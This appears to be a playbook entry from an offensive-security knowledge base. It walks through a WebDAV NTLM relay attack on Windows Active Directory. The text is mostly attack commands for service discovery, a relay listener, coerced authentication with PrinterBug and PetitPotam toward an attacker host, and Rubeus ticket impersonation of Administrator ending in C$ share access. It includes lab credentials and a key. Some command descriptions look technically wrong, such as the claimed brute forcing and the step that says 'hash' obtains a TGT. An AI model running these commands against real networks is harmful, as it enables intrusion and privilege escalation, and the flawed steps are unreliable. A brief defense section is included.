---
id: 9d12f102-7fa3-40bf-a205-4fb61edc85eb
name: WebDAV-Relay-Attack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:05.686392+00:00'
updated_at: '2023-04-10T20:36:04.034913+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Brute Force|T1110 - Brute Force]]'
  - '[[techniques/Pass the Ticket|T1097 - Pass the Ticket]]'
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques:
  - >-
    [[sub-techniques/SMB/Windows Admin Shares|T1021.002 - SMB/Windows Admin
    Shares]]
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Man-in-the-Middle attacks & relaying]]'
  - '[[tags/Relaying with WebDav Trick]]'
commands:
  - '[[commands/webclientservicescanner-scan]]'
  - '[[commands/crackmapexec-webdav-brute]]'
  - '[[commands/getwebdavstatus-check]]'
  - '[[commands/dementor-generate-malicious-file]]'
  - '[[commands/spoolsample-send-file]]'
  - '[[commands/petitpotam-trigger-auth]]'
  - '[[commands/petitpotam-trigger-auth-with-creds]]'
  - '[[commands/petitpotam-exe-trigger-auth]]'
  - '[[commands/rubeus-obtain-tgt-hash]]'
  - '[[commands/rubeus-s4u-impersonate-admin]]'
  - '[[commands/access-smb-share-c-drive]]'
platforms:
  - Windows
tools:
  - '[[tools/CrackMapExec]]'
  - '[[tools/Rubeus]]'
  - '[[tools/PetitPotam]]'
  - '[[tools/SpoolSample]]'
  - '[[tools/Dementor]]'
validated: true
---

# WebDAV-Relay-Attack

## Summary

The WebDAV Relay Attack is a man-in-the-middle technique that exploits NTLM authentication in Windows environments to relay credentials from a victim's WebDAV authentication attempt to a target system, enabling unauthorized access, privilege escalation, or lateral movement. It combines service discovery, malicious file generation, authentication triggering via PrinterBug or PetitPotam, and post-relay ticket usage for SMB access.

## Description

This procedure targets Active Directory environments where WebDAV services are enabled and NTLM is in use. The attacker sets up a relay listener (e.g., ntlmrelayx), tricks the victim into authenticating to a malicious WebDAV endpoint, and relays the NTLM hash to compromise a target like a domain controller or file share. Once relayed, the obtained credentials or tickets can be used for S4U impersonation to access admin shares. This is particularly effective against systems vulnerable to coerced authentication without SMB signing enforced. The attack requires network proximity and assumes the attacker has low-privilege credentials for initial triggering.

## Requirements

1. Attacker machine with Python 3 and Impacket suite installed for ntlmrelayx listener.
2. Valid domain credentials (low-privilege user) for triggering authentication.
3. Network access to target machines and WebDAV services (ports 445/SMB, 80/443/WebDAV).
4. Tools: CrackMapExec, Rubeus, PetitPotam (Python/EXE), SpoolSample, Dementor.
5. Target environment: Windows Active Directory with NTLM enabled and WebDAV services active.

## Defense

- Enable SMB signing and disable NTLMv1/v2 where possible; enforce LDAP signing.
- Monitor for anomalous NTLM authentication attempts and relay traffic using tools like Microsoft ATA or network IDS.
- Disable unnecessary WebDAV services and restrict printer spooler access via GPO.
- Implement EPA (Extended Protection for Authentication) on services.
- Log and alert on coerced authentication patterns from tools like PetitPotam.

## Objectives

1. Discover active WebDAV services on target machines.
2. Relay victim NTLM credentials to gain access to remote systems.
3. Use relayed credentials for privilege escalation and lateral movement via SMB shares.
4. Achieve administrative access to target hosts.

## Instructions

### Step 1: Discover WebDAV Services

**Context**: Identify machines with vulnerable WebDAV services to target for the relay attack. This step uses scanning and brute-force to confirm service availability and credential validity.

**Command** ([[commands/webclientservicescanner-scan]]):
```powershell
webclientservicescanner 'domain.local'/'user':'password'@'machine'
```

> This command scans the specified machine for WebDAV services using provided credentials. It checks for enabled WebClient service configurations. Expected output: Confirmation of WebDAV status or error if disabled.

**Command** ([[commands/crackmapexec-webdav-brute]]):
```bash
crackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
```

> Brute-forces credentials specifically against WebDAV modules on target IPs or ranges. Expected output: Pwned status for valid creds or failed attempts listed per host.

**Command** ([[commands/getwebdavstatus-check]]):
```powershell
GetWebDAVStatus.exe 'machine'
```

> Retrieves detailed status of WebDAV on the target machine. Expected output: Enabled/disabled status, version info, and configuration details.

### Step 2: Set Up Relay Listener

**Context**: Before triggering, start the NTLM relay listener to capture and forward authentication attempts to the target (e.g., DC for DCSync or SMB for shares).

Use [[tools/Impacket]]'s ntlmrelayx.py:
```bash
ntlmrelayx.py -t smb://target.dc.domain.local --no-http-server
```

> This listens for NTLM auth and relays to the specified target. Expected output: Listening on ports, ready for relays. Ensure no HTTP server if not needed for WebDAV simulation.

### Step 3: Generate and Send Malicious File (PrinterBug Method)

**Context**: For the PrinterBug variant, create a malicious .spl file that points the victim's spooler to the attacker's relay endpoint.

**Command** ([[commands/dementor-generate-malicious-file]]):
```bash
dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
```

> Generates the malicious spool file using domain creds. Expected output: Created .spl file ready for delivery.

**Command** ([[commands/spoolsample-send-file]]):
```bash
SpoolSample.exe "ATTACKER_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
```

> Sends the file to the target, coercing spooler authentication to the attacker. Expected output: Successful send, triggering NTLM auth relay.

### Step 4: Trigger Authentication (PetitPotam Method)

**Context**: Coerce MS-EFSRPC authentication to force NTLM relay without user interaction. Use authenticated or unauthenticated modes based on access.

**Command** ([[commands/petitpotam-trigger-auth]]):
```bash
Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
```

> Unauthenticated trigger for PetitPotam. Expected output: Authentication coerced, relay captured if listener active.

**Command** ([[commands/petitpotam-trigger-auth-with-creds]]):
```bash
Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
```

> Authenticated variant for restricted environments. Expected output: Successful coercion and relay.

**Command** ([[commands/petitpotam-exe-trigger-auth]]):
```bash
PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
```

> EXE version for Windows-native execution. Expected output: Same as Python variant.

### Step 5: Obtain and Use Relayed Credentials

**Context**: After relay, use the captured hash (e.g., for account WVLFLLKZ$) to request tickets and impersonate for access.

**Command** ([[commands/rubeus-obtain-tgt-hash]]):
```powershell
.\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
```

> Requests TGT using the relayed hash/password. Expected output: TGT ticket generated and displayed in base64.

**Command** ([[commands/rubeus-s4u-impersonate-admin]]):
```powershell
.\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
```

> Performs S4U2self/S4U2proxy to impersonate Administrator for CIFS service. Expected output: Service ticket injected via PTT.

**Command** ([[commands/access-smb-share-c-drive]]):
```bash
ls \\PC1.purple.lab\c$
```

> Accesses the admin share using the impersonated ticket. Expected output: Directory listing of C$ drive contents.
